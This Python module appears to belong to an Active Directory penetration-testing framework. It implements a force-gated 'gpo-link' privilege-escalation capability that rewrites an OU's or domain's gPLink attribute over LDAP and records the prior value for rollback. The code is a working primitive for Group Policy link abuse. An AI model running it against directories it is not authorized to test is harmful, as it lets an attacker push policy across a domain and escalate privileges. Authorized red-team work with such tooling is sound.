"""Force-gated GPO link mutation with rollback capture."""

from __future__ import annotations

import json
from typing import Any

from ldap3 import BASE, MODIFY_REPLACE

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


@register_capability(
    id="gpo-link",
    summary="Replace an approved GPO link with rollback capture",
    destructive=True,
    category="privilege-escalation",
    tags=("gpo", "link", "cleanup"),
)
class GpoLink:
    """Set an OU/domain gPLink value and retain the exact prior value."""

    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        dn = kwargs.get("write_target")
        link = kwargs.get("value")
        if not force or not dn or not link:
            raise RuntimeError("gpo-link requires --force, --write-target, and --value")

        conn, _base, _cfg = ldap_connect(target)
        try:
            conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["gPLink"])
            if not conn.entries:
                raise RuntimeError("GPO link target not found")
            previous = str(conn.entries[0].gPLink) if conn.entries[0].gPLink else ""
            ok = conn.modify(dn, {"gPLink": [(MODIFY_REPLACE, [link])]})
            result = {
                "target": dn,
                "ok": bool(ok),
                "result": dict(conn.result),
            }
        finally:
            conn.unbind()

        if result["ok"]:
            session.register_cleanup(
                {
                    "kind": "gpo-link",
                    "target": dn,
                    "previous": previous,
                    "rollback": "Restore the recorded gPLink value.",
                }
            )

        session.path("gpo-link.json").write_text(
            json.dumps(result, indent=2, default=str) + "\n", encoding="utf-8"
        )
        return result
